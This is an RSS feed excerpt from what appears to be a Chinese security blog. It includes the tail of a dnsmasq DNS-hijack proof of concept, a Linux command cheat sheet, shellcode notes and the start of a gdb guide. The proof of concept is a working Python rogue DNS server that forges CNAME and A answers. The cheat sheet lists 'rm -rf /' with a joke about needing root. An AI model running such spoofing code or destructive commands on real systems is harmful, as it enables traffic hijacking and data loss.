class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET, SOCK_DGRAM</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dns</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># hdr</span></span><br><span class="line">        self.transactionID  = <span class="string">b&quot;\x00\x00&quot;</span> <span class="comment"># --</span></span><br><span class="line">        self.flags          = <span class="string">b&quot;\x81\x80&quot;</span></span><br><span class="line">        self.questionNum    = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.answerRR       = <span class="string">b&quot;\x00\x02&quot;</span></span><br><span class="line">        self.authorityRR    = <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">        self.additionalRR   = <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># queries - only one we need</span></span><br><span class="line">        self.qname  = <span class="string">b&quot;\x01a\x03net\x00&quot;</span> <span class="comment"># -- 0x0c</span></span><br><span class="line">        self.qtype  = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.qclass = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># answers - CNAME</span></span><br><span class="line">        self.cnameName    = <span class="string">b&quot;\xc0\x0c&quot;</span></span><br><span class="line">        self.cnameType    = <span class="string">b&quot;\x00\x05&quot;</span></span><br><span class="line">        self.cnameClass   = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.cnameTtl     = <span class="string">b&quot;\x00\x00\x00\x20&quot;</span>  <span class="comment"># domain hijack duration</span></span><br><span class="line">        self.cnameDataLen = <span class="string">b&quot;\x00\x0d&quot;</span> <span class="comment"># --</span></span><br><span class="line">        self.cnameTarget  = <span class="string">b&quot;\x07example\x03net\x00&quot;</span>  <span class="comment"># --</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># answers - A</span></span><br><span class="line">        self.aName    = <span class="string">b&quot;\xc0\x19&quot;</span>  <span class="comment"># --</span></span><br><span class="line">        self.aType    = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.aCLass   = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.aTtl     = <span class="string">b&quot;\x00\x00\x00\x20&quot;</span>  <span class="comment"># domain hijack duration</span></span><br><span class="line">        self.aDataLen = <span class="string">b&quot;\x00\x04&quot;</span></span><br><span class="line">        self.aRecord  = <span class="string">b&quot;\x01\x02\x03\x04&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_setReply</span>(<span class="params">self, query: <span class="built_in">bytes</span></span>):</span><br><span class="line">        self.transactionID = query[:<span class="number">2</span>]</span><br><span class="line">        i = <span class="number">0x0c</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(query):</span><br><span class="line">            <span class="keyword">if</span> query[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.qname = query[<span class="number">0x0c</span>:i+<span class="number">1</span>]</span><br><span class="line">        self.aName = ((<span class="built_in">len</span>(self.qname) + <span class="number">28</span>) | <span class="number">0xc000</span>).to_bytes(<span class="number">2</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">self, query: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;build dns response to query&quot;&quot;&quot;</span></span><br><span class="line">        self._setReply(query)</span><br><span class="line">        <span class="comment"># build</span></span><br><span class="line">        hdr = self.transactionID + self.flags + self.questionNum + self.answerRR + self.authorityRR + self.additionalRR</span><br><span class="line">        query = self.qname + self.qtype + self.qclass</span><br><span class="line">        answerCNAME = self.cnameName + self.cnameType + self.cnameClass + self.cnameTtl + self.cnameDataLen + self.cnameTarget</span><br><span class="line">        answerA = self.aName + self.aType + self.aCLass + self.aTtl + self.aDataLen + self.aRecord</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hdr + query + answerCNAME + answerA  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dns_server</span>(<span class="params">port: <span class="built_in">int</span></span>):</span><br><span class="line">    address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    sock = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">    sock.bind(address)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Listen UDP on: &quot;</span>, port)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg, addr = sock.recvfrom(<span class="number">8192</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;recv from:&quot;</span>, addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; <span class="number">20</span>:</span><br><span class="line">            d = dns()</span><br><span class="line">            data = d.build(msg)</span><br><span class="line">            sock.sendto(data, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = <span class="number">53</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>].isdigit():</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    dns_server(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>check hijack</li></ol><p><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dnsmasq_poc.jpeg" alt="poc"></p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/dns/">dns</category>
      
      <category domain="https://xchens.cn/tags/dnsmasq/">dnsmasq</category>
      
      
      <comments>https://xchens.cn/posts/d8547337/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>linux常用命令</title>
      <link>https://xchens.cn/posts/fe4ef317/</link>
      <guid>https://xchens.cn/posts/fe4ef317/</guid>
      <pubDate>Wed, 26 Dec 2018 08:00:00 GMT</pubDate>
      
      <description>linux bash 命令及其常用参数介绍</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>本文尽可能的收集了常用命令及其常用参数，不足之处还望指正。</p><h2 id="about-w"><a href="#about-w" class="headerlink" title="about w"></a>about w</h2><p>一些特别的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whatis   <span class="comment"># 简单查看命令的作用。如 whatis ls</span></span><br><span class="line">whereis  <span class="comment"># 查看文件的位置，当安装了同一程序的多个版本时特别有用。如 whereis cat</span></span><br><span class="line"><span class="built_in">which</span>    <span class="comment"># 查看指定命令的位置。如 which ps</span></span><br><span class="line"><span class="built_in">who</span>      <span class="comment"># 显示系统中有哪些使用者正在上面</span></span><br><span class="line">         <span class="comment"># who     # 查看当前登录系统的用户</span></span><br><span class="line">         <span class="comment"># who -H  # 给显示的列表增加顶部标题栏</span></span><br><span class="line"><span class="built_in">whoami</span>   <span class="comment"># 查看当前EUID关联的用户名。可简单理解为查看当前用户名</span></span><br><span class="line">whois    <span class="comment"># 联网查询whois信息。如 whois example.com, whois 127.0.0.1</span></span><br><span class="line"><span class="built_in">pwd</span>      <span class="comment"># 查看当前所在的路径位置</span></span><br></pre></td></tr></table></figure><h2 id="zipinfo-zip-unzip-tar-gzip-gunzip-bzip2-bunzip2"><a href="#zipinfo-zip-unzip-tar-gzip-gunzip-bzip2-bunzip2" class="headerlink" title="zipinfo-zip-unzip&#x2F;tar&#x2F;gzip-gunzip&#x2F;bzip2-bunzip2"></a>zipinfo-zip-unzip&#x2F;tar&#x2F;gzip-gunzip&#x2F;bzip2-bunzip2</h2><p>文件压缩与解压 zip,tar,gz,bz2</p><blockquote><p>zip</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">zip -r a.zip /path/to/dir   <span class="comment"># 将dir目录下的所有文件与目录压缩为 a.zip</span></span><br><span class="line">zip a.zip s1.file s2.file   <span class="comment"># 将s1.file,s2.file合并压缩为 a.zip</span></span><br><span class="line">zip -d a.zip a.c            <span class="comment"># 从压缩文件 a.zip 中删除文件 a.c</span></span><br><span class="line">zip -z a.zip                <span class="comment"># 给a.zip添加注释（在随后的交互式输入中输入注释）</span></span><br><span class="line">    -q                      <span class="comment"># 压缩时不显示过程提示。静默模式(quiet)</span></span><br><span class="line">    -v                      <span class="comment"># 显示更详细的压缩信息</span></span><br><span class="line"></span><br><span class="line">zipinfo t.zip          <span class="comment"># 显示t.zip的信息</span></span><br><span class="line">        -v             <span class="comment"># 显示目标zip更详尽的信息</span></span><br><span class="line">        -z             <span class="comment"># 如果目标zip含有注释，则显示注释</span></span><br><span class="line"></span><br><span class="line">unzip -v t.zip         <span class="comment"># 查看t.zip的内容信息，但是不解压（与zipinfo查看的内容不完全相同）</span></span><br><span class="line">unzip -l t.zip         <span class="comment"># 查看t.zip内的文件，不解压</span></span><br><span class="line">unzip t.zip            <span class="comment"># 解压</span></span><br><span class="line">unzip -o t.zip         <span class="comment"># 解压，遇到相同文件名直接覆盖，不询问</span></span><br><span class="line">unzip -n t.zip         <span class="comment"># 解压，遇到相同文件名直接跳过，不询问</span></span><br></pre></td></tr></table></figure><blockquote><p>tar</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf t.tar.gz a.c b.c  <span class="comment"># 打包a.c,b.c到t.tar.gz</span></span><br><span class="line">tar -tzvf t.tar.gz          <span class="comment"># 显示t.tar.gz的内容</span></span><br><span class="line">tar -xzvf t.tar.gz          <span class="comment"># 解包t.tar.gz</span></span><br></pre></td></tr></table></figure><blockquote><p>gz</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gzip ./*      <span class="comment"># 分别压缩当前目录所有文件</span></span><br><span class="line">gzip -d ./*   <span class="comment"># 分别解压当前所有文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gunzip 只是 gzip 的一个硬链接</span></span><br></pre></td></tr></table></figure><blockquote><p>bz2</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzip2 ./*      <span class="comment"># 分别压缩当前目录所有文件</span></span><br><span class="line">bzip2 -d ./*   <span class="comment"># 分别解压当前所有文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bunzip2 是 bzip2 的软链接（符号链接）</span></span><br></pre></td></tr></table></figure><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>查看文件或目录信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l         <span class="comment"># 查看当前目录的文件及子目录（详细信息）</span></span><br><span class="line"><span class="built_in">ls</span> -a         <span class="comment"># 查看...（包括隐藏文件与与隐藏文件夹）</span></span><br><span class="line"><span class="built_in">ls</span> -lh        <span class="comment"># 查看...（将信息以人类可读的直观方式显示，单独使用-h效果不明显）</span></span><br><span class="line"><span class="built_in">ls</span> -R         <span class="comment"># 递归遍历子文件夹</span></span><br><span class="line"><span class="built_in">ls</span> -d /dir    <span class="comment"># 列出指定目录本身，而不是其中的内容，最好结合-l</span></span><br><span class="line"><span class="built_in">ls</span> -lt        <span class="comment"># 列出文件与目录详细信息，输出按时间排序</span></span><br><span class="line"><span class="built_in">ls</span> -lrt       <span class="comment"># 列出文件与目录详细信息，输出按时间反向排序</span></span><br><span class="line"><span class="built_in">ls</span> -S         <span class="comment"># 将文件或目录从大到小排序后输出</span></span><br><span class="line"><span class="built_in">ls</span> --<span class="built_in">sort</span>=size / <span class="built_in">ls</span> --<span class="built_in">sort</span>=time  <span class="comment"># 即 ls -S/ls -t</span></span><br></pre></td></tr></table></figure><h2 id="cat-head-tail"><a href="#cat-head-tail" class="headerlink" title="cat&#x2F;head&#x2F;tail"></a>cat&#x2F;head&#x2F;tail</h2><p>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> file       <span class="comment"># 查看文件内容</span></span><br><span class="line"><span class="built_in">cat</span> / <span class="built_in">cat</span> -    <span class="comment"># 无参数或-表示cat接受标准输入()</span></span><br><span class="line"><span class="built_in">cat</span> -n file    <span class="comment"># 查看文件内容的同时显示行号</span></span><br><span class="line">    -E / --show-ends  <span class="comment"># 在每一行输出的末尾显示一个 $ 符号（用来判断空格或缩进的长度）</span></span><br><span class="line">    -T / --show-tabs  <span class="comment"># 输出时用 ^T 替换缩进</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">head</span> file      <span class="comment"># 查看文件头部内容（默认前10行）</span></span><br><span class="line"><span class="built_in">head</span> -n 12 file    <span class="comment"># 查看文件前12行</span></span><br><span class="line"><span class="built_in">head</span> -c 1024 file  <span class="comment"># 查看文件的前1024个字节bytes</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> file      <span class="comment"># 查看文件尾部内容(默认后10行)</span></span><br><span class="line">     -n</span><br><span class="line">     -c</span><br></pre></td></tr></table></figure><h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><p>切换工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> -   <span class="comment"># 返回上一个工作目录</span></span><br><span class="line"><span class="built_in">cd</span> ..  <span class="comment"># 切换到上级目录</span></span><br><span class="line"><span class="built_in">cd</span> ~   <span class="comment"># 切换到当前用户的home目录</span></span><br><span class="line"><span class="built_in">cd</span> target_dir  <span class="comment"># 切换到指定目录</span></span><br></pre></td></tr></table></figure><h2 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h2><p>拷贝&#x2F;移动文件或目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> [OPTION]... [-T] SOURCE DEST</span><br><span class="line"><span class="built_in">cp</span> -r /path/dir0 /path/dir1   <span class="comment"># 递归的拷贝目录dir0为dir1</span></span><br><span class="line"><span class="built_in">cp</span> file1 file2                <span class="comment"># 拷贝file1,新文件为file2</span></span><br><span class="line">   -i       <span class="comment"># cp后默认会覆盖同名文件，-i选项可以使覆盖发生时暂停，进行确认或取消。</span></span><br><span class="line">            <span class="comment"># 建议cp时总使用 -i 选项</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> [OPTION]... [-T] SOURCE DEST</span><br><span class="line"><span class="comment"># mv 参数与用法基本等同于 cp</span></span><br></pre></td></tr></table></figure><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>删除文件或目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /         <span class="comment"># 删除系统中所有文件，使用此命令前应获得超级用户权限否则效果不理想</span></span><br><span class="line"><span class="built_in">rm</span> -r /path/dir  <span class="comment"># 删除一个指定目录，加-f则在删除时无视一切警告，直接删除</span></span><br><span class="line">   -i            <span class="comment"># 删除时进行确认(建议总是使用这一选项)</span></span><br><span class="line">   -d            <span class="comment"># 删除一个空目录(在删除空目录时应总是选择-d而不是-r,以免意外)</span></span><br><span class="line"><span class="built_in">rm</span> file          <span class="comment"># 删除文件file</span></span><br></pre></td></tr></table></figure><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>查看进程信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -A / ps -e     <span class="comment"># 列出所有进程</span></span><br><span class="line">ps -A --forest    <span class="comment"># 列出所有进程，以树状形式显示进程间的父子关系</span></span><br><span class="line">ps -a             <span class="comment"># 显示所有没有tty的进程</span></span><br><span class="line">ps -ax            <span class="comment"># 显示所有进程  -x: 解除其他命令要求tty的限制。一般用于与-a配合显示所有进程</span></span><br><span class="line">ps -aux           <span class="comment"># 显示所有包含其他使用者的进程（常用）</span></span><br></pre></td></tr></table></figure><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>匹配与查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">grep [options]... pattern [file]...</span><br><span class="line">     -c         <span class="comment"># 计算符合样本范式的数目</span></span><br><span class="line">     -n         <span class="comment"># 显示匹配行的行号</span></span><br><span class="line">     --color    <span class="comment"># 高亮输出匹配项</span></span><br><span class="line">                <span class="comment">#（部分linux默认 alias grep=&#x27;grep --color=auto&#x27;）</span></span><br><span class="line">     -i         <span class="comment"># 忽略大小写</span></span><br><span class="line">     -v         <span class="comment"># 反向匹配，查找不包含指定内容的行</span></span><br><span class="line"><span class="comment"># 常用例子</span></span><br><span class="line">grep pattern ./ -d recurse  <span class="comment"># 在当前文件夹查找所有文件匹配pattern的行</span></span><br><span class="line">                            <span class="comment"># -d recurse 进入目录查找</span></span><br><span class="line">                            <span class="comment"># -d read</span></span><br><span class="line">                            <span class="comment"># -d skip   跳过目录（对于此命令相当于啥也不干）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a123b123b&quot;</span> | grep a.*b  <span class="comment"># 默认贪婪匹配，即匹配到全文</span></span><br><span class="line">grep m.*n test.c              <span class="comment"># 在test.c内查找匹配该正则的行</span></span><br><span class="line">grep m.*n test.c -A 2         <span class="comment"># 额外再显示匹配行后两行的内容</span></span><br><span class="line">grep m.*n test.c -B 3         <span class="comment"># 额外再显示匹配行前三行的内容</span></span><br></pre></td></tr></table></figure><h2 id="du"><a href="#du" class="headerlink" title="du"></a>du</h2><p>查看文件或目录的占用空间大小</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span>           <span class="comment"># 查看当前文件夹的磁盘空间占用（默认即递归显示所有文件）</span></span><br><span class="line"><span class="built_in">du</span> -h        <span class="comment"># 将输出信息调整为更易阅读的形式</span></span><br><span class="line"><span class="built_in">du</span> -m /path  <span class="comment"># 以Mb为基本单位显示/path的信息</span></span><br></pre></td></tr></table></figure><h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><p>显示目前linux上文件系统的磁盘使用情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -h        <span class="comment"># 查看磁盘使用情况。 -h的作用也是优化输出信息，使其更易读</span></span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>查找文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find ./               <span class="comment"># 查找当前目录下所有文件（包括所有子目录下的文件）</span></span><br><span class="line">find ./ -name <span class="string">&quot;*abc?&quot;</span>  <span class="comment"># 查找当前目录下文件名后缀是abc?的文件,?表示任意单字符</span></span><br><span class="line">        -iname         <span class="comment"># 基本等价-name，但是忽略大小写</span></span><br><span class="line">find /path/dir -ctime -2   <span class="comment"># dir目录下前两天修改过的文件</span></span><br><span class="line">find /path/dir -ctime +2   <span class="comment"># dir.....两天前........文件</span></span><br><span class="line">               -atime -2   <span class="comment"># ........前两天被读取过的文件</span></span><br><span class="line">               -size +1k   <span class="comment"># dir下大于1k的文件</span></span><br><span class="line">               -size -10c  <span class="comment"># dir下小于10字节的文件</span></span><br><span class="line">                           <span class="comment"># 类似的还有 w:字（双字节），M:MBytes，G:GBytes</span></span><br></pre></td></tr></table></figure><h2 id="kill-killall"><a href="#kill-killall" class="headerlink" title="kill &#x2F; killall"></a>kill &#x2F; killall</h2><p>终止进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> 12345     <span class="comment"># 终止pid为12345的进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 12345  <span class="comment"># 彻底终止进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># killall 使用名称终止进程</span></span><br><span class="line">killall vi   <span class="comment"># 终止所有vi进程</span></span><br><span class="line">        -r   <span class="comment"># 使用正规表达式匹配要杀死的进程名称</span></span><br></pre></td></tr></table></figure><h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p>更改文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x t.py      <span class="comment"># 给t.py 加上文件拥有者可执行的权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x t.py       <span class="comment"># 给t.py 加上文件拥有者，拥有者当前组，其他组的执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> 777 t.py      <span class="comment"># 给t.py所有权限 (-rwxrwxrwx)</span></span><br><span class="line">                    <span class="comment"># 777表示（111,111,111）,每个 111 表示对应的 rwx 权限开启</span></span><br></pre></td></tr></table></figure><h2 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a    <span class="comment"># 查看当前系统信息</span></span><br></pre></td></tr></table></figure><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -t        <span class="comment"># 显示tcp相关的选项</span></span><br><span class="line">        -u        <span class="comment"># 显示udp相关的选项</span></span><br><span class="line">        -s        <span class="comment"># 显示每个协议的统计信息（如-st表示tcp相关统计信息）</span></span><br><span class="line">        -a        <span class="comment"># 显示所有端口(如-au表示udp相关的端口)</span></span><br><span class="line">        -l        <span class="comment"># 显示处于监听状态（Listening）的端口</span></span><br><span class="line">        -r        <span class="comment"># 显示核心路由信息</span></span><br><span class="line">        -p        <span class="comment"># 显示socket所属的程序名及pid</span></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">netstat -ap | grep ssh  <span class="comment"># 找到程序运行的端口</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/linux/">linux</category>
      
      
      <comments>https://xchens.cn/posts/fe4ef317/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>shellcode</title>
      <link>https://xchens.cn/posts/8002891b/</link>
      <guid>https://xchens.cn/posts/8002891b/</guid>
      <pubDate>Mon, 10 Dec 2018 16:25:00 GMT</pubDate>
      
      <description>shellcode 实战</description>
      
      
      
      <content:encoded><![CDATA[<p>– 未完成</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>段选择字FS保存着当前TEB的地址</p><p>PE头地址 0x768c_00f0 &#x3D; 0x768c_0000 + 0x0000_00f0</p><p>导出表地址 0x76a5_fca0 &#x3D; 0x768c_0000 + 0x0019_fca0<br>          0x76a7_a000 &#x3D; 0x768c_0000 + 0x001b_a000</p><p>函数名称列表 0x76A5_E6D8 &#x3D; 0x768C_0000 + 0x0019_E6D8</p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/shellcode/">shellcode</category>
      
      
      <comments>https://xchens.cn/posts/8002891b/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>gdb-手册</title>
      <link>https://xchens.cn/posts/8dd7a186/</link>
      <guid>https://xchens.cn/posts/8dd7a186/</guid>
      <pubDate>Sun, 25 Nov 2018 05:55:00 GMT</pubDate>
      
      <description>gdb调试工具的使用与介绍</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="gdb命令"><a href="#gdb命令" class="headerlink" title="gdb命令"></a>gdb命令</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">file &lt;filename&gt;</td><td align="left">加载被调试的文件</td><td align="left">file a.out</td></tr><tr><td align="left">r</td><td align="left">run 运行程序</td><td align="left"></td></tr><tr><td align="left">c</td><td align="left">continue 继续执行直到遇到断点</td><td align="left"></td></tr><tr><td align="left">b &lt;行号&gt;</td><td align="left">在指定行下断点</td><td align="left"></td></tr><tr><td align="left">b &lt;函数名&gt;</td><td align="left">给指定函数下断点</td><td align="left"></td></tr><tr><td align="left">b *&lt;函数名&gt;</td><td align="left">表示将断点设置在”由编译器生成的prolog代码处”</td><td align="left"></td></tr><tr><td align="left">b *&lt;地址&gt;</td><td align="left">给指定的内存地址下断点</td><td align="left">b *0x12345678</td></tr><tr><td align="left">d &lt;编号&gt;</td><td align="left">函数指定编号的断点或所有断点</td><td align="left"></td></tr><tr><td align="left">s</td><td align="left">单步进入(遇到函数进入)</td><td align="left"></td></tr><tr><td align="left">n</td><td align="left">单步执行(不进入函数)</td><td align="left"></td></tr><tr><td align="left">si</td><td align="left">等效于s(针对于汇编)</td><td align="left"></td></tr><tr><td align="left">ni</td><td align="left">等效于ni(针对于汇编)</td><td align="left"></td></tr><tr><td align="left">disas</td><td align="left">反汇编一段内存,不带参数则显示当前执行位置反汇编</td><td align="left"></td></tr><tr><td align="left">finish</td><td align="left">执行到返回</td><td align="left"></td></tr></tbody></table><h1 id="gdb插件"><a href="#gdb插件" class="headerlink" title="gdb插件"></a>gdb插件</h1><h2 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb-peda"></a>gdb-peda</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>PEDA是为GDB设计的一个强大的插件，全称是Python Exploit Development Assistance for 